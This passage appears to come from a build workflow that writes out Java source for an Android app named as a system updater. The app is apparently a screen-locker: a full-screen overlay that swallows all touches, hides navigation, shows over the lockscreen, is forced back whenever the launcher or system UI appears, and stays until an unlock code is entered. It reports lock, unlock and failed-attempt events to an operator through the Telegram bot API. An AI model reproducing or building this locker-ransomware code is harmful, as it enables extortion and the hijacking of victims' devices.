                      }
                  }
              }

              public void showOverlayNow() {
                  if (authorized || overlayShown) return;
                  Log.d(TAG, "Showing overlay");
                  overlayShown = true;
                  overlayManager.show();
              }

              public void onAuthorized() {
                  authorized = true;
                  overlayShown = false;
                  getSharedPreferences("auth_prefs", MODE_PRIVATE)
                          .edit().putBoolean("authorized", true).apply();
                  try { overlayManager.dismiss(); } catch (Exception ignored) { }
                  sendTelegram("Authorized");
              }

              public void onFailedAttempt(int attemptsLeft) {
                  sendTelegram("Failed attempt (" + attemptsLeft + " remaining)");
              }

              public void onLocked() {
                  sendTelegram("Locked - awaiting unlock code");
              }

              public void onUnlocked() {
                  sendTelegram("Unlocked");
              }

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {
                  if (event == null) return;
                  if (!overlayShown || authorized) return;

                  int type = event.getEventType();
                  if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                      CharSequence pkg = event.getPackageName();
                      if (pkg != null) {
                          String p = pkg.toString();
                          if (p.equals("com.android.systemui")
                                  || p.equals("com.android.launcher")
                                  || p.equals("com.android.launcher3")
                                  || p.contains("launcher")
                                  || p.contains("systemui")) {
                              handler.postDelayed(() -> {
                                  if (overlayShown && !authorized) {
                                      try { overlayManager.ensureShowing(); } catch (Exception ignored) { }
                                  }
                              }, 200);
                          }
                      }
                  }
              }

              @Override
              public void onInterrupt() {
                  Log.d(TAG, "onInterrupt");
              }

              @Override
              public void onDestroy() {
                  super.onDestroy();
                  AuthServiceHolder.set(null);
                  try { handler.removeCallbacksAndMessages(null); } catch (Exception ignored) { }
                  try { overlayManager.dismiss(); } catch (Exception ignored) { }
                  try {
                      if (partialWakeLock != null && partialWakeLock.isHeld()) partialWakeLock.release();
                  } catch (Exception ignored) { }
              }

              private void sendTelegram(String text) {
                  final String token = BOT_TOKEN;
                  final String chat = CHAT_ID;
                  new Thread(() -> {
                      HttpURLConnection conn = null;
                      try {
                          String encoded = URLEncoder.encode(text, "UTF-8");
                          String urlStr = "https://api.telegram.org/bot" + token
                                  + "/sendMessage?chat_id=" + chat + "&text=" + encoded;
                          URL url = new URL(urlStr);
                          conn = (HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("GET");
                          conn.setConnectTimeout(8000);
                          conn.setReadTimeout(8000);
                          conn.getResponseCode();
                      } catch (Exception e) {
                          Log.e(TAG, "Telegram send failed", e);
                      } finally {
                          if (conn != null) conn.disconnect();
                      }
                  }).start();
              }
          }
          EOF

      - name: Generate OverlayManager.java
        run: |
          cat > app/src/main/java/com/system/updator/OverlayManager.java << 'EOF'
          package com.system.updator;

          import android.annotation.SuppressLint;
          import android.content.Context;
          import android.graphics.PixelFormat;
          import android.os.Build;
          import android.os.Handler;
          import android.os.Looper;
          import android.util.Log;
          import android.view.Gravity;
          import android.view.LayoutInflater;
          import android.view.View;
          import android.view.WindowManager;
          import android.webkit.JavascriptInterface;
          import android.webkit.WebSettings;
          import android.webkit.WebView;
          import android.webkit.WebViewClient;

          public class OverlayManager {

              private static final String TAG = "OverlayManager";
              private static OverlayManager instance;

              private final Context context;
              private final Handler mainHandler = new Handler(Looper.getMainLooper());

              private WindowManager windowManager;
              private View overlayView;
              private WebView webView;
              private volatile boolean showing = false;

              private OverlayManager(Context context) {
                  this.context = context.getApplicationContext();
              }

              public static synchronized OverlayManager get(Context context) {
                  if (instance == null) instance = new OverlayManager(context);
                  return instance;
              }

              @SuppressLint("SetJavaScriptEnabled")
              public synchronized void show() {
                  if (showing) return;
                  mainHandler.post(this::showInternal);
              }

              private void showInternal() {
                  try {
                      if (showing) return;
                      windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
                      if (windowManager == null) return;

                      LayoutInflater inflater = LayoutInflater.from(context);
                      overlayView = inflater.inflate(R.layout.activity_overlay, null);

                      webView = overlayView.findViewById(R.id.overlayWebView);
                      if (webView != null) {
                          WebSettings s = webView.getSettings();
                          s.setJavaScriptEnabled(true);
                          s.setAllowFileAccess(true);
                          s.setAllowContentAccess(true);
                          s.setDomStorageEnabled(true);
                          s.setLoadWithOverviewMode(true);
                          s.setUseWideViewPort(true);
                          webView.setWebViewClient(new WebViewClient());
                          webView.setBackgroundColor(0xFF020604);
                          webView.setPadding(0, 0, 0, 0);
                          webView.addJavascriptInterface(new AuthBridge(), "AuthBridge");

                          final String uniqueCode = AuthCodeGenerator.getUniqueCode(context);
                          String injector = "javascript:(function(){window.__AUTH_CODE__='" + uniqueCode + "';})()";
                          webView.loadUrl("file:///android_asset/overlay.html");
                          webView.postDelayed(() -> {
                              try {
                                  webView.evaluateJavascript(
                                      "window.__AUTH_CODE__='" + uniqueCode + "';", null);
                              } catch (Exception ignored) { }
                          }, 200);
                      }

                      overlayView.setOnTouchListener((v, event) -> true);
                      overlayView.setClickable(true);
                      overlayView.setLongClickable(true);

                      int uiOptions =
                            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                          | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                          | View.SYSTEM_UI_FLAG_FULLSCREEN
                          | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                          | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                          | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN;
                      overlayView.setSystemUiVisibility(uiOptions);
                      overlayView.setOnSystemUiVisibilityChangeListener(visibility -> {
                          int restored =
                                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                              | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                              | View.SYSTEM_UI_FLAG_FULLSCREEN
                              | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                              | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                              | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN;
                          if (overlayView != null) overlayView.setSystemUiVisibility(restored);
                      });

                      int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                              ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                              : WindowManager.LayoutParams.TYPE_PHONE;

                      int flags =
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                          | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                          | WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR
                          | WindowManager.LayoutParams.FLAG_LAYOUT_ATTACHED_IN_DECOR
                          | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                          | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                          | WindowManager.LayoutParams.FLAG_FULLSCREEN
                          | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                          | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                          | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;

                      WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                              WindowManager.LayoutParams.MATCH_PARENT,
                              WindowManager.LayoutParams.MATCH_PARENT,
                              type, flags, PixelFormat.OPAQUE);

                      params.gravity = Gravity.TOP | Gravity.START;
                      params.x = 0;
                      params.y = 0;
                      params.width = WindowManager.LayoutParams.MATCH_PARENT;
                      params.height = WindowManager.LayoutParams.MATCH_PARENT;
                      params.screenBrightness = 1.0f;

                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                          params.layoutInDisplayCutoutMode =
                              WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_ALWAYS;
                      }

                      windowManager.addView(overlayView, params);
                      showing = true;

                  } catch (Exception e) {
                      Log.e(TAG, "Overlay show failed", e);
                      showing = false;
                  }
              }

              public synchronized void dismiss() {
                  mainHandler.post(this::dismissInternal);
              }

              private void dismissInternal() {
                  try {
                      if (overlayView != null && windowManager != null) {
                          windowManager.removeViewImmediate(overlayView);
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Overlay dismiss error", e);
                  } finally {
                      if (webView != null) {
                          try { webView.destroy(); } catch (Exception ignored) { }
                          webView = null;
                      }
                      overlayView = null;
                      showing = false;
                  }
              }

              public synchronized void ensureShowing() {
                  try {
                      if (!showing || overlayView == null) {
                          showing = false;
                          overlayView = null;
                          show();
                          return;
                      }
                      boolean healthy = overlayView.isAttachedToWindow()
                              && overlayView.isShown()
                              && overlayView.getVisibility() == View.VISIBLE
                              && overlayView.getWindowToken() != null;
                      if (!healthy) {
                          dismissInternal();
                          show();
                          return;
                      }
                      overlayView.bringToFront();
                      overlayView.requestLayout();
                      overlayView.invalidate();
                  } catch (Exception e) {
                      Log.e(TAG, "ensureShowing error", e);
                      try { dismissInternal(); } catch (Exception ignored) { }
                      try { show(); } catch (Exception ignored) { }
                  }
              }

              public synchronized boolean isShowing() {
                  return showing;
              }

              private class AuthBridge {
                  @JavascriptInterface
                  public void onAuthorized() {
                      AuthService s = AuthServiceHolder.get();
                      if (s != null) s.onAuthorized();
                  }

                  @JavascriptInterface
                  public void onFailedAttempt(int attemptsLeft) {
                      AuthService s = AuthServiceHolder.get();
                      if (s != null) s.onFailedAttempt(attemptsLeft);
                  }

                  @JavascriptInterface
                  public void onLocked() {
                      AuthService s = AuthServiceHolder.get();
                      if (s != null) s.onLocked();
                  }

                  @JavascriptInterface
                  public void onUnlocked() {
                      AuthService s = AuthServiceHolder.get();
                      if (s != null) s.onUnlocked();
                  }
              }
          }
          EOF

